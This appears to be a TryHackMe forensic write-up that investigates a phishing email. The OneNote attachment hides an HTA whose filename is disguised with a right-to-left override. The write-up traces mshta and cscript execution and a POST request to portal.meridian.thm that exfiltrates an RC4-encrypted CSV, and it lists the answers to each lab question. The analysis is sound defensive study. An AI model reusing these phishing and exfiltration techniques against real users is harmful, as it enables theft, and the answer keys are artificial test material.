# The Waiting Room
### Scenario

Michelle Smith received a supplier email concerning an upcoming payment run. After opening an attachment, her workstation contacted an unfamiliar service.

The investigation examines the email and its embedded files, follows execution through the Windows event logs, and uses the network capture to identify and recover the document transferred from the workstation.

The attachments were examined statically, without executing their contents.
| Field | Details |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| Category | DFIR, malware analysis, network forensics |
| Evidence | Supplier email (`.eml`), Windows event log (`.evtx`), network capture (`.pcap`) |
| Tools | one-extract, evtx_dump, Wireshark, CyberChef |
| Author | dmncdcco |

## Inspecting the Supplier Email

The investigation began with the supplied `.eml` file. Its headers identified the following correspondence:

| Field | Value |
|---|---|
| From | Luke Sullivan `<accounts@meridian.thm>` |
| To | Michelle Smith `<m.smith@westbrook.thm>` |
| Subject | `October stationery order / PO-1048` |
| Date | `6 October 2026, 17:40:07 UTC` |
| Attachment | `Remittance.one` |

The message referred to an invoice, a delivery breakdown, and remittance advice. It asked Michelle to confirm whether the order could be included in the Friday payment run.

One instruction was particularly relevant: if the attachment opened in the note viewer, the recipient should save a copy before opening it so that the payment reference would carry through correctly. This provided a business-related reason to save and open the attachment.

The MIME headers identified the attachment:

```text
Content-Type: application/onenote
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Remittance.one"
```

Base64 was the email’s attachment encoding. Decoding that section produces the OneNote file itself, rather than readable script text.

The email was opened in an email viewer, and `Remittance.one` was saved for examination.

## Investigation

### Question 1

- What is the SHA-256 hash of the embedded attachment that initiated the suspicious activity?

- **Answer:** `e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3`

A OneNote file can contain text, images, and embedded attachments. The next step was to determine what this particular file contained.

The embedded objects were extracted with `one-extract`:

```bash
mkdir -p extracted
one-extract --extract-files --output-directory extracted Remittance.one
```

Their types were then checked:

```bash
file extracted/*
```

Six files were recovered:

| Extracted file | Identified type |
|---|---|
| `Remittance.one_0.extracted` | PNG image, 32 × 32 |
| `Remittance.one_1.extracted` | HTML document, ASCII text |
| `Remittance.one_2.extracted` | PNG image, 32 × 32 |
| `Remittance.one_3.extracted` | PNG image, 32 × 32 |
| `Remittance.one_4.extracted` | PDF document, version 1.4, one page |
| `Remittance.one_5.extracted` | CSV text |

The HTML document stood out among the images, PDF, and CSV. However, the `file` result alone did not establish that it was an HTA application.

Its contents were inspected:

```bash
strings extracted/Remittance.one_1.extracted
```

The opening section contained an explicit HTA declaration:

```html
<hta:application
    id="receipt"
    applicationname="Remittance Advice"
    border="thin"
    showintaskbar="no"
    windowstate="minimize"/>
```

This identified the extracted content as an HTML Application. The file also contained JScript and a body that invoked its main function automatically:

```html
<body onload="loadReceipt()">
```

The application was configured to start minimized and avoid appearing in the taskbar.

The hash was calculated directly from the extracted HTA:

```bash
sha256sum extracted/Remittance.one_1.extracted
```

The hash belongs to the embedded HTA, rather than the email or the OneNote container.

### Question 2

- Which Unicode code point was used to disguise that attachment’s displayed filename?

- **Answer:** `U+202E`

The extraction tool assigned numbered filenames to the recovered objects. To examine the original names stored in the OneNote file, its UTF-16LE strings were inspected:

```bash
strings -el Remittance.one | less
```

The output included legitimate-looking document names:

```text
Delivery-summary.csv
Invoice-MR-6106-028.pdf
```

Another name appeared split:

```text
Remittance_
fdp.hta
```

The break between the prefix and the remaining filename suggested that a nonprinting or otherwise unusual character might be present. This output did not identify its Unicode code point, so the original data needed closer inspection.

The attachment’s Base64 section from the email was loaded into CyberChef with the following recipe:

```text
From Base64
Decode text — UTF-16LE (1200)
Escape Unicode Characters
```

The resulting output contained substantial unrelated binary data rendered as text. Searching for the already observed `Remittance_` prefix located the filename:

```text
Remittance_\u202Efdp.hta
```

The escaped representation exposed the hidden character as **U+202E**, RIGHT-TO-LEFT OVERRIDE. It changes the display direction of the characters that follow it, allowing the filename to resemble a PDF while retaining the actual `.hta` extension.

### Question 3

- Which hostname served the downloaded stage?

- **Answer:** `portal.meridian.thm`

The network capture was filtered in Wireshark to display HTTP requests:

```wireshark
http.request
```

Two packets matched the filter. The GET request was selected, and **Follow → HTTP Stream** was used to inspect the exchange. The request contained:

```http
GET /assets/remittance-v2.png HTTP/1.1
Host: portal.meridian.thm:8080
```

The `Host` header identified the hostname as `portal.meridian.thm`; `8080` was the destination port.

### Question 4

- What was the process ID of the interpreter that executed the downloaded script?

- **Answer:** `1996`

The Sysmon JSONL output was searched for the script name:

```bash
grep -i 'receipt' sysmon.jsonl
```

The matching output included the following process creation details:

```json
{
  "EventData": {
    "RuleName": "-",
    "UtcTime": "2026-10-06 18:02:29.242",
    "ProcessGuid": "C24FC70D-37B5-6AC5-6801-000000000600",
    "ProcessId": 1996,
    "Image": "C:\\Windows\\SysWOW64\\cscript.exe",
    "FileVersion": "5.812.10240.16384",
    "Description": "Microsoft ® Console Based Script Host",
    "Product": "Microsoft ® Windows Script Host",
    "Company": "Microsoft Corporation",
    "OriginalFileName": "cscript.exe",
    "CommandLine": "\"C:\\Windows\\System32\\cscript.exe\" //B //Nologo \"C:\\Users\\m.smith\\AppData\\Local\\Meridian\\receipt.js\" MR-6106-028",
    "CurrentDirectory": "C:\\Users\\m.smith\\Downloads\\PO-1048\\",
    "User": "MERIDIAN\\m.smith",
    "LogonGuid": "C24FC70D-2EE9-6AC5-0769-020000000000",
    "LogonId": "0x26907",
    "TerminalSessionId": 1,
    "IntegrityLevel": "Medium",
    "Hashes": "SHA256=B6C61C065F8BCA4A5B8F560C12379859BDCAA0844245A3A31025614C086FF89A",
    "ParentProcessGuid": "C24FC70D-37B4-6AC5-6701-000000000600",
    "ParentProcessId": 4780,
    "ParentImage": "C:\\Windows\\SysWOW64\\mshta.exe",
    "ParentCommandLine": "\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\m.smith\\Downloads\\PO-1048\\Remittance_‮fdp.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ",
    "ParentUser": "MERIDIAN\\m.smith"
  }
}
```

The `CommandLine` showed that `cscript.exe` executed `receipt.js`. Its `ProcessId` was **1996**, and its parent was `mshta.exe`, which had opened the HTA attachment.

### Question 5

- What encryption key protected the document transferred from the workstation?

- **Answer:** `3c7a8c88466f5b869bea15f333e3be01`

The key was recovered from `entries[9]` in the HTA. Its obfuscated value was:

```text
0a5a0e58015a01010d0f0f5f0c5b010f005b5c58080c5f0a0a0a5c0a5b5c0908
```

Applying `From Hex` followed by XOR with decimal `57` in CyberChef produced:

```text
3c7a8c88466f5b869bea15f333e3be01
```

The HTA assigned this value through `h = value(9)`, converted it into key bytes, and passed those bytes to its RC4 routine.

To examine the document transfer, the network capture was filtered in Wireshark for outbound HTTP POST requests:

```wireshark
http.request.method == "POST"
```

Following the relevant HTTP stream revealed:

```http
POST /api/receipt HTTP/1.1
Host: portal.meridian.thm:8080
Content-Type: application/json
```

The request body contained these fields:

| JSON field | Observed value |
|---|---|
| `reference` | `MR-6106-028` |
| `workstation` | `MERIDIAN` |
| `user` | `m.smith` |
| `document` | `payment-register.csv` |
| `data` | Base64-encoded encrypted content |

The reference matched the argument supplied when `cscript.exe` launched `receipt.js`.

The server returned `HTTP/1.0 200 OK` with the response body:

```json
{"accepted":true,"reference":"MR-6106-028"}
```

The value of the JSON `data` field was copied into CyberChef, excluding its surrounding quotation marks and the rest of the HTTP stream. The recovery recipe was:

```text
From Base64
RC4
```

The RC4 key was entered with its format set to **Hex**. The decrypted output produced readable CSV content, confirming that the key recovered from the HTA could decrypt the transferred document.

### Question 6

- What is the SHA-256 hash of the document transferred from the workstation?

- **Answer:** `c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a`

The decrypted bytes were downloaded directly from CyberChef as `payment-register.csv`. Copying the text into an editor was avoided because changes to line endings or encoding would change its hash.

The recovered document was hashed:

```bash
sha256sum payment-register.csv
```

The resulting SHA-256 was:

```text
c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a
```

## Findings

The email delivered a OneNote attachment containing ordinary document material alongside an HTA. The HTA’s filename used a right-to-left override character to disguise its displayed extension.

Static analysis revealed an obfuscated download URL, an RC4 decoding routine, and instructions to write and execute `receipt.js`. Windows events identified the script interpreter, while the network capture exposed the encrypted transfer of `payment-register.csv`. Recovering the request data allowed the document to be decrypted and hashed.

| Indicator | Value |
|---|---|
| Embedded HTA name, escaped | `Remittance_\u202Efdp.hta` |
| Download URL | `http://portal.meridian.thm:8080/assets/remittance-v2.png` |
| Transfer endpoint | `http://portal.meridian.thm:8080/api/receipt` |

---

*This write-up is intended for educational purposes and authorized security research.*
